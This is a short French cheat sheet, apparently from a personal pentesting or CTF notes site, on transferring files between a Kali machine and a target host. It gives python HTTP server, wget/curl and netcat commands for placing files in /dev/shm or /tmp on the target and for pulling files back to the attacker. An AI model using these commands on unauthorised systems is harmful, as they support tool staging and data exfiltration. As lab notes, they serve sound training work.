---
title: "Copier Fichiers Kali"
description: "Comment copier des fichiers de et vers Kali."
tags: ["recettes","tools", "copier-fichiers"]
categories: ["Mes recettes"]
date: 2025-11-26T16:38:12+01:00
---

## Transfert via HTTP (simple, rapide, universel)

### **Kali → Cible**

- Sur **Kali** (envoyer) :

  ```bash
  cd /chemin/du/fichier
  python3 -m http.server 8000
  ```

- Sur **la cible** (recevoir) :

  ```bash
  cd /chemin/du/fichier (/dev/shm ou /tmp)
  wget http://<adresse tun0 de kali>:8000/fichier
  # ou
  curl -O http://<adresse tun0 de kali>:8000/fichier
  ```
  
  ------

### Cible → Kali

- Sur **la cible** (envoyer) :

  ```bash
  cd /chemin/du/fichier
  python3 -m http.server 8000
  ```

- Sur **Kali** (recevoir) :

  ```bash
  cd /chemin/du/fichier
  
  wget http://IP_CIBLE:8000/fichier
  # ou
  curl -O http://IP_CIBLE:8000/fichier
  ```
  
  ------

## Transfert via Netcat (nc)

  Méthode brute, idéale si pas de `wget`, pas de `curl`, pas de Python Web, etc.

### **Kali → Cible**

- Sur **la cible** (recevoir) :

  ```bash
  cd /chemin/du/fichier (/dev/shm ou /tmp)
  nc -lnvp 4444 > fichier_recu
  ```

- Sur **Kali** (envoyer) :

  ```bash
  cd /chemin/du/fichier
  nc IP_CIBLE 4444 < fichier_a_envoyer
  ```
  
  ------

### **Cible → Kali**

- Sur **Kali** (recevoir) :

  ```bash
  cd /chemin/du/fichier
  nc -lnvp 4444 > fichier_recu
  ```

- Sur **la cible** (envoyer) :

  ```bash
  cd /chemin/du/fichier
  nc <adresse tun0 de kali> 4444 < fichier_a_envoyer
  ```
  
  ------

##  **Résumé en une phrase**

  - **HTTP** : la machine qui envoie lance un petit serveur (`python3 -m http.server`), l'autre télécharge avec `wget` ou `curl`.
  - **Netcat** : la machine qui reçoit écoute (`nc -lnvp 4444 > fichier`), l'autre se connecte et envoie (`nc IP 4444 < fichier`). Le port utilisé peut être choisi librement, à condition qu’il soit ouvert et disponible sur la machine qui reçoit. On utilise en général le `4444` mais moi j'aime bien aussi le `12345`.
